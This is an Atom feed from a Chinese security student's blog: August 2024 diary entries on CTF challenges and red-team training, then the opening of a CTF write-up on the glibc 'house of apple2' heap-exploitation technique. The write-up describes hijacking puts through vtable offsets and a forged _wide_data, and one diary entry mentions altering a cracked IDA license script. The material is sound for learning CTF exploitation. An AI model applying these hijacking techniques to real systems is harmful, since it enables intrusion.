  <entry>
    <title>日志 24-8-18</title>
    <link href="https://c-lby.top/2024/08/18/diary/24-8-18/"/>
    <id>https://c-lby.top/2024/08/18/diary/24-8-18/</id>
    <published>2024-08-17T16:29:16.000Z</published>
    <updated>2024-08-18T17:48:46.105Z</updated>
    
    <content type="html"><![CDATA[<p>今天学的内容，是路由器固件漏洞挖掘和杀软漏洞挖掘。没有讲到环境模拟和固件提取，专注于讲漏洞挖掘。学到很多东西。捋一下</p><ul><li>实战中，IDA逆向分析的入手点一般是字符串。像路由器和杀软这样的二进制程序，会产生大量的日志，写这些日志就会有很多字符串留存在程序当中，而且其实一般不会像CTF一样各种隐藏。所以可以把具体位置的日志信息当做注释来看，辅助分析。</li><li>有些攻击面，有些漏洞，其实要结合web的知识，尤其是逻辑漏洞。比如没有过滤字符导致的目录穿越、sql注入等等。不要只带着二进制漏洞的思想去看iot中的漏挖</li><li>一般路由器（包括其他IOT设备）最好是挖未授权，授权后的漏洞一般利用条件比较难。</li><li>不要和别人挤破头都去找大热门被挖烂了的攻击面，找些冷门的。</li><li>不要放过任何一个小洞，可能可以和其他洞组合成一个大洞。</li><li>有些路由器是可以ssh上去的（比如华硕）</li></ul><p>初次体验了一下fuzz，用winafl，虽然最后因为环境配置问题（主要还是那个RIO），没跑成功。RIO如果要在本地编译需要安装perl，现在安装这玩意真是鬼死麻烦，已下载安装包，<strong>未配置，有时间再跑一下</strong>。讲讲收获：</p><ul><li>如何在cpp中静、动态调用dll，封装想要调试的函数（或流程）。</li><li>fuzz一个封装了想要测试的接口的程序，比测试原本的程序更快更方便。</li><li>winafl的参数设置，<strong>后面专门写一篇博客分析一下</strong>，还有写多开主次线程的批处理文件方法。</li><li>对于二进制插桩有了更深一层的理解，但是感觉还远远不够。</li><li><a href="https://libuv-docs-chinese.readthedocs.io/zh/latest/api.html">libuv库</a></li></ul><p>同学来问关于wsl代理的问题，我也是该<strong>找时间研究一下</strong>了，自己使用起来也是有点麻烦的，包括git终端也是不走代理，很难受。关于<a href="https://blog.dejavu.moe/posts/cfw-tun/">tun</a>和<a href="https://clashforwindows.cc/tun-%E6%A8%A1%E5%BC%8F/">tun</a>。</p><p>VM的vmdk磁盘文件可以通过ovf加载整台虚拟机，如果遇到hash对不上的情况，删掉打包的时候带有的mf文件即可。</p>]]></content>
    
    
    <summary type="html">三项待办</summary>
    
    
    
    <category term="diary" scheme="https://c-lby.top/categories/diary/"/>
    
    
    <category term="diary" scheme="https://c-lby.top/tags/diary/"/>
    
  </entry>
  
  <entry>
    <title>日志 24-8-17</title>
    <link href="https://c-lby.top/2024/08/17/diary/24-8-17/"/>
    <id>https://c-lby.top/2024/08/17/diary/24-8-17/</id>
    <published>2024-08-17T01:29:19.000Z</published>
    <updated>2024-08-17T19:59:55.952Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.yuque.com/hxfqg9">yichen师傅的知识库</a>，有IoT，硬件安全，智能合约，web等.</p><p>劳累的一天。今天学内网渗透，虽然因为不怎么感兴趣而听得很潦草（？），但是依然学到了很多东西。不得不承认，这个地方真的能学到东西，老师真的会告诉你要怎么实操，要找什么东西要怎么找。这两三天来大量高深知识涌入脑子，能不能吸收另当别论，至少确确实实是有用且能用的知识与技能。</p><p>大部分知识也都记在笔记里了，重要的是晚上的靶场模拟演练切切实实感受了一遍内网渗透，或者说后渗透的大致流程和一些操作技巧等等。但是因为没什么经验，所以打得很菜，实际能找到的flag只有两个……虽然跟着思路现学新工具和知识复现打出了4个flag，依然有一个没能找到。</p><p>学到的新知识或资源有</p><ul><li><a href="https://www.anquanke.com/post/id/225870">内存马</a></li><li>冰蝎的使用（很强大，可以扫描网络资产存活的主机和运行的服务，搭建隧道实现内网穿透等等）</li><li>cve-2021-26084（<a href="https://www.cnblogs.com/NoId/p/16573825.html">confluence</a>的一个rce）</li><li>PostgreSQL数据库（可以用navicat连接，也可以用linux下的psql工具）</li><li>开源工具ConfluenceMemshell，可以一键给confluence注入内存马（有漏洞的情况下）</li><li><a href="https://blog.csdn.net/qq_39583774/article/details/130947754">双重内网横穿</a>，其实今天的靶场中最后一步也有这个场景，但是没做出来，有待复现</li><li><a href="https://tq.jxsec.cn/cas/index">天穹靶场</a></li><li><a href="https://www.somd5.com/">somd5</a></li></ul><p>哦对，顺便把kernel basic和ret2usr学了，虽然还没自己复现，有时间再说吧。大概思路是明白了，果然，之前没看懂的的知识，过一段时间再看就能看懂了，虽然最本初的原理还没去研究，但是流程和做法大致理解了。</p><p>顺带一提，还要找时间看看IDA9的破解原理，看能不能把名字改一下。其实研究那个py脚本文件就好了吧我想。看了一眼，果不其然，试试能不能改生效。大功告成！</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.yuque.com/hxfqg9&quot;&gt;yichen师傅的知识库&lt;/a&gt;，有IoT，硬件安全，智能合约，web等.&lt;/p&gt;
&lt;p&gt;劳累的一天。今天学内网渗透，虽然因为不怎么感兴趣而听得很潦草（？），但是依然学到了很多东西。不得不承认，这个地方真的能学到东西，老师真的会告诉你要怎么实操，要找什么东西要怎么找。这两三天来大量高深知识涌入脑子，能不能吸收另当别论，至少确确实实是有用且能用的知识与技能。&lt;/p&gt;
&lt;p&gt;大部分知识也都记在笔记里了，重要的是晚上的靶场模拟演练切切实实感受了一遍内网渗透，或者说后渗透的大致流程和一些操作技巧等等。但是因为没什么经验，所以打得很菜，实际能找到的flag只有两个……虽然跟着思路现学新工具和知识复现打出了4个flag，依然有一个没能找到。&lt;/p&gt;</summary>
    
    
    
    <category term="diary" scheme="https://c-lby.top/categories/diary/"/>
    
    
    <category term="diary" scheme="https://c-lby.top/tags/diary/"/>
    
  </entry>
  
  <entry>
    <title>日志 24-8-16</title>
    <link href="https://c-lby.top/2024/08/16/diary/24-8-16/"/>
    <id>https://c-lby.top/2024/08/16/diary/24-8-16/</id>
    <published>2024-08-15T17:15:52.000Z</published>
    <updated>2024-08-16T17:20:45.439Z</updated>
    
    <content type="html"><![CDATA[<p>其实现在是17号凌晨，不过有接触到新的东西所以还是记录一下。首先是今天培训讲的内容有关Windows免杀，还算是比较感兴趣。但是苦于基础知识不多，开发能力欠缺，学起来和实践起来还是有点痛苦的。如果以后要走免杀研究或者杀软对抗这条路的话，至少要学好cpp、go、rust之类的语言，同时还要学Windows api相关的东西。</p><p>第二是做了一道背包加密的题目，用LLL算法在sage进行解密，这部分知识有待进一步深入学习。<a href="https://blog.csdn.net/XiongSiqi_blog/article/details/132109655">资料</a></p><p>第三是，很久没用过web伪协议的知识了，应该要回顾一下了。</p><p>第四是，我觉得可能当下比较重要的一点，应该要开始接触一点点linux kernel的内容了。<a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#0x00-%E7%BB%AA%E8%AE%BA">资料是a3师傅的博客</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;其实现在是17号凌晨，不过有接触到新的东西所以还是记录一下。首先是今天培训讲的内容有关Windows免杀，还算是比较感兴趣。但是苦于基础知识不多，开发能力欠缺，学起来和实践起来还是有点痛苦的。如果以后要走免杀研究或者杀软对抗这条路的话，至少要学好cpp、go、rust之类的语言，同时还要学Windows api相关的东西。&lt;/p&gt;
&lt;p&gt;第二是做了一道背包加密的题目，用LLL算法在sage进行解密，这部分知识有待进一步深入学习。&lt;a href=&quot;https://blog.csdn.net/XiongSiqi_blog/article/details/132109655&quot;&gt;资料&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;第三是，很久没用过web伪协议的知识了，应该要回顾一下了。&lt;/p&gt;</summary>
    
    
    
    <category term="diary" scheme="https://c-lby.top/categories/diary/"/>
    
    
    <category term="diary" scheme="https://c-lby.top/tags/diary/"/>
    
  </entry>
  
  <entry>
    <title>日志 24-8-14</title>
    <link href="https://c-lby.top/2024/08/14/diary/24-8-14/"/>
    <id>https://c-lby.top/2024/08/14/diary/24-8-14/</id>
    <published>2024-08-14T02:41:38.000Z</published>
    <updated>2024-08-14T15:50:59.173Z</updated>
    
    <content type="html"><![CDATA[<p>今天似乎什么也没学，来青马红客训练营这边报了个道，也是来到锦行科技的公司了。</p><p>VN的成员页做好了，因为头像托管在github上加载有点慢，所以汪队帮我传到oss上了<a href="https://vnteam.cn/members/%E3%80%82oss%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F%E9%98%BF%E9%87%8C%E4%BA%91%E7%9A%84%E5%AF%B9%E8%B1%A1%E5%82%A8%E5%AD%98%E6%9C%8D%E5%8A%A1%E3%80%82%E6%9C%89%E6%97%B6%E9%97%B4%E4%BA%86%E8%A7%A3%E4%B8%80%E4%B8%8B%E3%80%82">https://vnteam.cn/members/。oss是什么？阿里云的对象储存服务。有时间了解一下。</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;今天似乎什么也没学，来青马红客训练营这边报了个道，也是来到锦行科技的公司了。&lt;/p&gt;
&lt;p&gt;VN的成员页做好了，因为头像托管在github上加载有点慢，所以汪队帮我传到oss上了&lt;a href=&quot;https://vnteam.cn/members/%E3%80%82oss%</summary>
      
    
    
    
    <category term="diary" scheme="https://c-lby.top/categories/diary/"/>
    
    
    <category term="diary" scheme="https://c-lby.top/tags/diary/"/>
    
  </entry>
  
  <entry>
    <title>日志 24-8-13</title>
    <link href="https://c-lby.top/2024/08/13/diary/24-8-13/"/>
    <id>https://c-lby.top/2024/08/13/diary/24-8-13/</id>
    <published>2024-08-13T02:38:17.000Z</published>
    <updated>2024-08-14T16:15:24.772Z</updated>
    
    <content type="html"><![CDATA[<p>ak了moe的web，太久没做ctf的web题，有点手生了。很艰难地学习并大概理解了pop链要怎么做，感谢jjg的帮助。<a href="https://blog.csdn.net/qq_45927266/article/details/120380343">资料</a>。之前是一点都看不懂，现在感觉能理解什么意思了，也知道要怎么生成payload了。最好还是全面学习一下php比较好，pwn题也会用得到。</p><p>晚上忽然上新一道运维题，抢救一个误删了glibc的linux系统，每次环境只有一次机会，因为仅存一个shell，如果断连了就没有了。也是第一次知道ls、cp这些命令是依赖于glibc的。找到了<a href="https://tech.soraharu.com/archives/96/">资料</a>，之前一直看到busybox，但没有真正去了解他，现在大概知道是个什么东西了。在我看来就是适合塞进嵌入式的小体积静态编译二进制程序包，可以实现linux的命令之类的功能，很方便。之后有时间也要深入了解一下。</p><p>感觉自己linux学得也是半斤八两，还是系统学习一下运维知识比较好。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;ak了moe的web，太久没做ctf的web题，有点手生了。很艰难地学习并大概理解了pop链要怎么做，感谢jjg的帮助。&lt;a href=&quot;https://blog.csdn.net/qq_45927266/article/details/120380343&quot;&gt;资料&lt;/a&gt;。之前是一点都看不懂，现在感觉能理解什么意思了，也知道要怎么生成payload了。最好还是全面学习一下php比较好，pwn题也会用得到。&lt;/p&gt;
&lt;p&gt;晚上忽然上新一道运维题，抢救一个误删了glibc的linux系统，每次环境只有一次机会，因为仅存一个shell，如果断连了就没有了。也是第一次知道ls、cp这些命令是依赖于glibc的。找到了&lt;a href=&quot;https://tech.soraharu.com/archives/96/&quot;&gt;资料&lt;/a&gt;，之前一直看到busybox，但没有真正去了解他，现在大概知道是个什么东西了。在我看来就是适合塞进嵌入式的小体积静态编译二进制程序包，可以实现linux的命令之类的功能，很方便。之后有时间也要深入了解一下。&lt;/p&gt;
&lt;p&gt;感觉自己linux学得也是半斤八两，还是系统学习一下运维知识比较好。&lt;/p&gt;</summary>
    
    
    
    <category term="diary" scheme="https://c-lby.top/categories/diary/"/>
    
    
    <category term="diary" scheme="https://c-lby.top/tags/diary/"/>
    
  </entry>
  
  <entry>
    <title>日志 24-8-12</title>
    <link href="https://c-lby.top/2024/08/12/diary/24-8-12/"/>
    <id>https://c-lby.top/2024/08/12/diary/24-8-12/</id>
    <published>2024-08-12T09:39:37.000Z</published>
    <updated>2024-08-12T09:40:44.121Z</updated>
    
    <content type="html"><![CDATA[<p>可算是把页面处理好了，但是页面读取文章只能从全部文章列表里筛选符合diary分类的文章出来显示。换句话来说，他会作为一篇post出现在其他页面，虽然可以用隐藏，但是写frontmatter比较麻烦，得想个办法才行。</p><p>换了个生成器，可以限定某个页面只显示特定tag的文章，完美解决。还有一点麻烦的是每次新建文章，都要手动整理文章到路径。如果用-p参数，则没法自动抓取front-matter模板，今日乏了，不改源码了。我记得好像有现成的插件可以自动分类文件夹的，明天在找找。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;可算是把页面处理好了，但是页面读取文章只能从全部文章列表里筛选符合diary分类的文章出来显示。换句话来说，他会作为一篇post出现在其他页面，虽然可以用隐藏，但是写frontmatter比较麻烦，得想个办法才行。&lt;/p&gt;
&lt;p&gt;换了个生成器，可以限定某个页面只显示特定ta</summary>
      
    
    
    
    <category term="diary" scheme="https://c-lby.top/categories/diary/"/>
    
    
    <category term="diary" scheme="https://c-lby.top/tags/diary/"/>
    
  </entry>
  
  <entry>
    <title>日志 24-8-11</title>
    <link href="https://c-lby.top/2024/08/11/diary/24-8-11/"/>
    <id>https://c-lby.top/2024/08/11/diary/24-8-11/</id>
    <published>2024-08-11T09:36:44.000Z</published>
    <updated>2024-08-12T09:43:34.461Z</updated>
    
    <content type="html"><![CDATA[<p>把moe的密码和misc也做了，ak了第一周密码。misc依然是脑洞不是很够。</p><p>开始捣鼓diary页面了。在写时尚小垃圾的时候发现，归档页面的title是中文，而其他页面title是英文，强迫症受不了，于是翻了一下几个ejs，改了改其他页面引用title的方式是从语言yml文件里来的就行了。</p><p>好像归档的界面就是最理想的对于日记排版的界面，有年月日和标题，打算就用这个了，改改里面储存文档的路径就好了，希望今晚能搞定。（21:31）</p><p>看来是搞不定，官方文档已经是新版本的变量了，旧版本只能靠自己摸索摸索了。现在要想办法在diary界面过滤tag，使得显示出来的文章只有diary的。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;把moe的密码和misc也做了，ak了第一周密码。misc依然是脑洞不是很够。&lt;/p&gt;
&lt;p&gt;开始捣鼓diary页面了。在写时尚小垃圾的时候发现，归档页面的title是中文，而其他页面title是英文，强迫症受不了，于是翻了一下几个ejs，改了改其他页面引用title的方式是从语言yml文件里来的就行了。&lt;/p&gt;
&lt;p&gt;好像归档的界面就是最理想的对于日记排版的界面，有年月日和标题，打算就用这个了，改改里面储存文档的路径就好了，希望今晚能搞定。（21:31）&lt;/p&gt;</summary>
    
    
    
    <category term="diary" scheme="https://c-lby.top/categories/diary/"/>
    
    
    <category term="diary" scheme="https://c-lby.top/tags/diary/"/>
    
  </entry>
  
  <entry>
    <title>日志 24-8-10</title>
    <link href="https://c-lby.top/2024/08/10/diary/24-8-10/"/>
    <id>https://c-lby.top/2024/08/10/diary/24-8-10/</id>
    <published>2024-08-10T09:12:37.000Z</published>
    <updated>2024-08-14T16:15:58.050Z</updated>
    
    <content type="html"><![CDATA[<p>前几天受到某个大佬的启发，想要在博客里加个日记的页面，每天记录一点当日搞的小玩意或者学到的东西，这样无论是记录当天学习内容还是为了第二天衔接没做完当天没做完的工作，都很方便。</p><p>事不宜迟，那么今天就开始升级博客了。首先是加装了页面加密和隐藏的插件，<a href="https://blog.yxyang.top/posts/24498.html">资料</a>。想在menu上加一个diary的页面，但是还没想好该怎么呈现内容，估计还得手搓一下ejs，所以页面这一块暂且搁置了。</p><p>把2024moectf的pwn第一周的题目做完了，题目依然是很有moe的味道，但是没有那么传统了，不如说新颖得有点不适应，虽然很简单，但是最后一题的引导性没那么好。misc的引导性就比较强。当然也有可能是我比较菜。</p><p>wsrx桌面版太麻烦，用习惯了linux，所以直接装了命令行的版本。这玩意是用rust写的，要求版本在1.77以上，所以还得rustup升级，结果下载安装好几遍都更换版本不成功，索性删掉重新安装。<a href="https://www.sysgeek.cn/ubuntu-install-rust/#google_vignette">资料</a>。到最后发现最重要的是要激活环境这一步source $HOME&#x2F;.cargo&#x2F;env，然而其他资料都没有写到。顺带一提，旧版本的rustup没有自删除的功能……用上命令行版本的wsrx就顺手多了，虽然还是很想吐槽，这四个字母在键盘上真的不好打……</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;前几天受到某个大佬的启发，想要在博客里加个日记的页面，每天记录一点当日搞的小玩意或者学到的东西，这样无论是记录当天学习内容还是为了第二天衔接没做完当天没做完的工作，都很方便。&lt;/p&gt;
&lt;p&gt;事不宜迟，那么今天就开始升级博客了。首先是加装了页面加密和隐藏的插件，&lt;a href=&quot;https://blog.yxyang.top/posts/24498.html&quot;&gt;资料&lt;/a&gt;。想在menu上加一个diary的页面，但是还没想好该怎么呈现内容，估计还得手搓一下ejs，所以页面这一块暂且搁置了。&lt;/p&gt;
&lt;p&gt;把2024moectf的pwn第一周的题目做完了，题目依然是很有moe的味道，但是没有那么传统了，不如说新颖得有点不适应，虽然很简单，但是最后一题的引导性没那么好。misc的引导性就比较强。当然也有可能是我比较菜。&lt;/p&gt;</summary>
    
    
    
    <category term="diary" scheme="https://c-lby.top/categories/diary/"/>
    
    
    <category term="diary" scheme="https://c-lby.top/tags/diary/"/>
    
  </entry>
  
  <entry>
    <title>『Heap Exploitation』对house of apple2的理解与分析</title>
    <link href="https://c-lby.top/2024/08/05/house-of-apple2/"/>
    <id>https://c-lby.top/2024/08/05/house-of-apple2/</id>
    <published>2024-08-05T02:46:29.000Z</published>
    <updated>2024-09-04T13:00:21.842Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>之前傻乎乎的在网上找资料学习的时候学得一头雾水，最近才忽然想到为什么不去<a href="https://www.roderickchan.cn/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2">roderick师傅的博客</a>直接看本人的分析呢。然后发现roderick师傅写的是最详细最易懂的，推荐正在学习apple2的师傅直接去看。</p><p>我这里据两道题来分析，记录一下学习的过程。</p><h3 id="0x01-知识点分析『DeadSec-CTF-2024』shadow"><a href="#0x01-知识点分析『DeadSec-CTF-2024』shadow" class="headerlink" title="0x01  知识点分析『DeadSec CTF 2024』shadow"></a>0x01  知识点分析『DeadSec CTF 2024』shadow</h3><p>略过泄露堆地址和libc地址的过程，详情看<a href="https://c-lby.top/2024/07/30/2024-deadsec-wp/">这篇文章</a>。这里直接关注利用house of apple2来getshell的部分。</p><h4 id="基础知识回顾"><a href="#基础知识回顾" class="headerlink" title="基础知识回顾"></a>基础知识回顾</h4><p>apple系列手法主要是劫持FILE结构中的<code>_wide_data</code>成员中的<code>_wide_vtable</code>中的某个函数指针为ogg或者system。要劫持哪个函数取决于选择的调用链。如果忘记或者不清楚的，建议先看原博客文章，再来看这里的具体分析。</p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>menu显示用的是puts函数（也可能是printf打印了出字符串加换行结尾，这种情况编译器也会将printf优化成puts函数），我们考虑劫持puts函数的输出流来打apple2。</p><h5 id="puts函数正常执行流程"><a href="#puts函数正常执行流程" class="headerlink" title="puts函数正常执行流程"></a>puts函数正常执行流程</h5><p>我们先关注一下puts函数正常执行流程是怎么样的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_puts (<span class="type">const</span> <span class="type">char</span> *str)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = EOF;</span><br><span class="line">  <span class="type">size_t</span> len = <span class="built_in">strlen</span> (str);</span><br><span class="line">  _IO_acquire_lock (<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((_IO_vtable_offset (<span class="built_in">stdout</span>) != <span class="number">0</span></span><br><span class="line">       || _IO_fwide (<span class="built_in">stdout</span>, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">      &amp;&amp; _IO_sputn (<span class="built_in">stdout</span>, str, len) == len</span><br><span class="line">      &amp;&amp; _IO_putc_unlocked (<span class="string">&#x27;\n&#x27;</span>, <span class="built_in">stdout</span>) != EOF)</span><br><span class="line">    result = MIN (INT_MAX, len + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  _IO_release_lock (<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)</span></span><br></pre></td></tr></table></figure><p>puts函数会通过宏调用到<code>_IO_XSPUTN</code>函数，随后又会通过根据偏移在vtable跳转到对应函数去执行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_XSPUTN(FP, DATA, N) JUMP2 (__xsputn, FP, DATA, N)</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);    &lt;--原本要解析的</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);  &lt;--我们想要解析的（准确来说是wide_vtable对应的那个seekoff，往下阅读）</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如果按照roderick师傅给出的三个调用链，那么我们需要让puts函数调用到<code>__overflow</code>或者<code>__doallocate</code>两个位置上。这里我选用了另一条调用链，需要从<code>__seekoff</code>作为入口。</p><h5 id="劫持vtable指针"><a href="#劫持vtable指针" class="headerlink" title="劫持vtable指针"></a>劫持vtable指针</h5><p>正常执行puts函数的话肯定不会达到<code>__seekoff</code>，所以我们要修改vtable指针为正常虚表地址加上0x10的偏移，让puts函数从xsputn解析到seekoff。因为只是加个偏移，虚表依然位于libc的虚表段中，不会触发检查报错。当然，这里虚表需要我们写入的是<code>_IO_wfile_jumps+0x10</code>，因为要调用到<code>_wide_data</code>成员相关的函数。这里是我们要修改的第一个地方。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span>   &lt;---要改成_IO_wfile_jumps+<span class="number">0x10</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h5 id="劫持-wide-data"><a href="#劫持-wide-data" class="headerlink" title="劫持_wide_data"></a>劫持_wide_data</h5><p>下面是第二个要修改的地方，file结构体中的<code>_wide_data</code>指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">      </span><br><span class="line">  <span class="type">__off64_t</span> _offset;</span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span>   &lt;---要修改的指针</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们需要将他修改为一个可控的地址，用来伪造虚表。我们来看一下这个结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;<span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;<span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;<span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> _<span class="title">codecvt</span>;</span></span><br><span class="line"></span><br><span class="line">  <span 